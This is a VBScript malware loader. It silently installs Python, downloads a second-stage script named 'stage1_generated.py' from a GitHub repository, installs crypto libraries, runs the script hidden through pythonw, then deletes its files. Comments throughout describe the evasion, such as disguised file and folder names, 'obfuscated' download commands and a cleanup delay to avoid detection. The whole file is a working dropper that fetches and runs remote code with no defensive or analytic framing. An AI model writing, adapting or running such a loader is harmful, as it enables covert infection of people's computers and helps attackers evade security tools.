' loader.vbs
' Single-file script to download and install Python, download a Python script, install libraries, and execute the script silently

' Variables
Dim PYTHON_URL, SCRIPT_URL, PYTHON_VERSION, INSTALL_DIR, SCRIPT_DIR, TEMP_DIR, PYTHON_INSTALLER, SCRIPT_NAME
PYTHON_URL = "https://www.python.org/ftp/python/3.11.7/python-3.11.7-amd64.exe"
SCRIPT_URL = "https://raw.githubusercontent.com/blockbastaz/ressources/refs/heads/main/asploit/stage1_generated.py"

' Extract Python version (e.g., "3.11.7" → "311")
Dim versionParts, majorMinor
versionParts = Split(PYTHON_URL, "/")
PYTHON_VERSION = versionParts(UBound(versionParts))
majorMinor = Mid(PYTHON_VERSION, InStr(PYTHON_VERSION, "-") + 1, InStr(PYTHON_VERSION, "-amd64.exe") - InStr(PYTHON_VERSION, "-") - 1)
majorMinor = Replace(Left(majorMinor, InStr(majorMinor, ".") + 2), ".", "")

' Set paths
Set WShell = CreateObject("WScript.Shell")
SCRIPT_DIR = WShell.CurrentDirectory
INSTALL_DIR = WShell.ExpandEnvironmentStrings("%LocalAppData%") & "\Programs\Py" & majorMinor ' Shortened to "Py311"

' Generate unique temp directory with less suspicious name
Dim timestamp
timestamp = Replace(Replace(Replace(Now, "/", ""), ":", ""), " ", "_")
TEMP_DIR = WShell.ExpandEnvironmentStrings("%TEMP%") & "\update_" & timestamp ' "update_" instead of "tmp_"
PYTHON_INSTALLER = TEMP_DIR & "\setup.exe" ' Less suspicious name
SCRIPT_NAME = TEMP_DIR & "\config.pyw" ' Less suspicious name

' File system object
Set FSO = CreateObject("Scripting.FileSystemObject")

' Create temp directory
If Not FSO.FolderExists(TEMP_DIR) Then
    FSO.CreateFolder TEMP_DIR
End If

' Function to run commands silently with delayed execution
Function RunCommand(cmd, wait)
    WShell.Run cmd, 0, wait
End Function

' Download Python installer with obfuscated PowerShell
RunCommand "cmd.exe /c echo $p='SilentlyContinue'; irm -Uri '" & PYTHON_URL & "' -OutFile '" & PYTHON_INSTALLER & "' >nul 2>&1", True

' Verify installer exists
If Not FSO.FileExists(PYTHON_INSTALLER) Then
    FSO.DeleteFolder TEMP_DIR, True
    WScript.Quit 1
End If

' Check if Python is installed
Dim pythonPath
pythonPath = INSTALL_DIR & "\python.exe"
If Not FSO.FileExists(pythonPath) Then
    ' Install Python silently with minimal flags
    RunCommand """" & PYTHON_INSTALLER & """ /quiet InstallAllUsers=0 TargetDir=""" & INSTALL_DIR & """ Include_pip=1", True
    
    ' Verify installation
    If Not FSO.FileExists(pythonPath) Then
        FSO.DeleteFolder TEMP_DIR, True
        WScript.Quit 1
    End If
End If

' Update PATH for session
WShell.Environment("PROCESS")("PATH") = WShell.Environment("PROCESS")("PATH") & ";" & INSTALL_DIR & ";" & INSTALL_DIR & "\Scripts"

' Verify Python
On Error Resume Next
RunCommand """" & pythonPath & """ --version", True
If Err.Number <> 0 Then
    FSO.DeleteFolder TEMP_DIR, True
    WScript.Quit 1
End If
On Error GoTo 0

' Download Python script with obfuscated command
RunCommand "cmd.exe /c echo $p='SilentlyContinue'; irm -Uri '" & SCRIPT_URL & "' -OutFile '" & SCRIPT_NAME & "' >nul 2>&1", True

' Verify script exists
If Not FSO.FileExists(SCRIPT_NAME) Then
    FSO.DeleteFolder TEMP_DIR, True
    WScript.Quit 1
End If

' Ensure pip
RunCommand """" & pythonPath & """ -m ensurepip --upgrade", True

' Install libraries with minimal output
RunCommand """" & pythonPath & """ -m pip install --quiet pyaesm urllib3 pycryptodome", True

' Execute script silently with pythonw.exe
RunCommand """" & INSTALL_DIR & "\pythonw.exe"" """ & SCRIPT_NAME & """", False

' Cleanup with delay to avoid immediate deletion detection
WScript.Sleep 1000 ' 1-second delay
If FSO.FileExists(PYTHON_INSTALLER) Then FSO.DeleteFile PYTHON_INSTALLER, True
If FSO.FileExists(SCRIPT_NAME) Then FSO.DeleteFile SCRIPT_NAME, True
If FSO.FolderExists(TEMP_DIR) Then FSO.DeleteFolder TEMP_DIR, True

WScript.Quit 0
